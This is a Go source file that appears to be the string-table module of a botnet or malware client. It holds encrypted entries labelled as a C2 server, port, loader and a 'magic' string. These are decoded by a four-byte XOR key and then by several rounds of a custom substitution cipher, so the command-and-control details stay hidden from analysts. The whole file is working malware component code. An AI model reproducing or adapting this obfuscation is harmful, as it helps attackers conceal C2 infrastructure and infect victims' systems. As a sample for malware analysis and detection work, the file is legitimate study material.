package main

import "fmt"

var database = make(map[int]map[string]interface{})
var key uint32 = 0x0B00B135

func tableInit() {
	addEntry(0, [] /*c2 server*/ byte{0xB1, 0xDC, 0xB1, 0xD4, 0xEA, 0xAD, 0xFE, 0xDF, 0xC3, 0xA2, 0xDD, 0xDC, 0xE6, 0xDC, 0xE6, 0xD4, 0xC1, 0xBC, 0xA2, 0xEF, 0xDC, 0xB1}, 22)
	addEntry(1, [] /*c2 port  */ byte{0xF1, 0xEE, 0xDA, 0xE7, 0xFF}, 5)
	addEntry(2, [] /*c2 loader*/ byte{0xE6, 0xDC, 0xFE, 0xBC, 0xA2, 0xFD, 0xDC, 0xDC, 0xFD, 0xE6, 0xD4, 0xA2, 0xEF, 0xDC, 0xB1}, 15)
	addEntry(3, [] /*c2 pekora*/ byte{0xD8, 0xC8, 0xDC, 0xEA, 0xB2, 0xD4, 0xC8, 0xDC, 0xCC, 0xC8, 0xDC, 0xEA, 0xB2, 0xD4, 0xC8, 0xDC, 0xCC, 0xC8, 0xDC, 0xEA, 0xB2, 0xD4, 0xC8, 0xDC, 0xD8, 0xCC}, 26)
	addEntry(4, [] /*uwu magic*/ byte{0xDF, 0xFE, 0xC1, 0xDF, 0xCC, 0xB0, 0xC1, 0xB0, 0xCC, 0xB8, 0xBC, 0xCC, 0xDC, 0xC1, 0xDC, 0xCC, 0xB1, 0xD4, 0xDC, 0xC1, 0xCC, 0xED, 0xC1, 0xDC, 0xCC, 0xC4, 0xB4, 0xE3, 0xCC, 0xB0, 0xC1, 0xD0, 0xCC, 0xC4, 0xF7, 0xAA, 0xED, 0xCC, 0xED, 0xC1, 0xD0, 0xD1, 0xF5, 0xA0, 0xE3, 0xC4, 0xCC, 0xA8, 0xD4, 0xD4, 0xA0, 0xD4, 0xD4, 0xCC, 0xD0, 0xC1, 0xD0, 0xCC, 0xD0, 0xC1, 0xED, 0xCC, 0xF7, 0xDD, 0xD4, 0xCC, 0xAA, 0xFE, 0xC1, 0xFE, 0xE8, 0xE8}, 72)
}

func addEntry(id int, data []byte, buf int) {
	if _, exists := database[id]; exists {
		if debug {
			msg := fmt.Sprintf("[table] Entry %d already exists in database", id)
			fmt.Println(msg)
		}
	} else {
		database[id] = map[string]interface{}{"data": data, "buf": buf}
	}
}

func xorDec(data []byte) []byte {
	n := make([]byte, 0)
	k1 := byte(key & 0xff)
	k2 := byte((key >> 8) & 0xff)
	k3 := byte((key >> 16) & 0xff)
	k4 := byte((key >> 24) & 0xff)

	for _, b := range data {
		tmp := b ^ k1
		tmp ^= k2
		tmp ^= k3
		tmp ^= k4
		n = append(n, tmp)
	}

	return n
}

func ciDec(data string) string { // Adding another level of... complexity
	chars := []rune{' ', '!', '"', '#', '$', '%', '&', '\'', '(', ')', '*', '+', ',', '-', '.', '/', ':', ';', '<', '=', '>', '?', '@', '[', '\\', ']', '^', '_', '`', '{', '|', '}', '~', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'}
	k := []rune{'Z', 'U', 't', '1', '.', '\\', '4', 'K', 'j', 'R', 'W', 'k', 'A', '?', 'u', '!', 'b', '[', 'm', ';', '{', '^', ',', 'X', 'r', 'V', '$', '\'', ' ', 'C', 'i', ']', '6', '%', 'J', '~', 'p', 'O', 'z', '"', 'F', 'L', '5', 'd', 'E', 'q', '7', '<', 'H', '&', '2', 'S', 'G', 'P', 'o', '`', '8', '/', 'Y', '3', 'I', ')', 's', '-', 'a', 'M', '(', 'v', 'w', 'f', 'g', '@', '+', 'D', 'n', 'y', '9', ':', 'x', 'B', 'c', 'l', '|', 'Q', '#', '0', 'h', '*', 'N', 'T', '}', '_', '>', 'e', '='}

	var decryptedText string
	for _, char := range data {
		for i, item := range k {
			if item == char {
				decryptedText += string(chars[i])
				break
			}
		}
	}

	return decryptedText
}

func table_getID(id int) string {
	dataBytes := database[id]["data"].([]byte)
	decryptedData := xorDec(dataBytes)
	op := ciDec(string(decryptedData))
	data := op

	for i := 0; i < 7; i++ {
		op = ciDec(string(data))
		data = op
	}

	return data
}
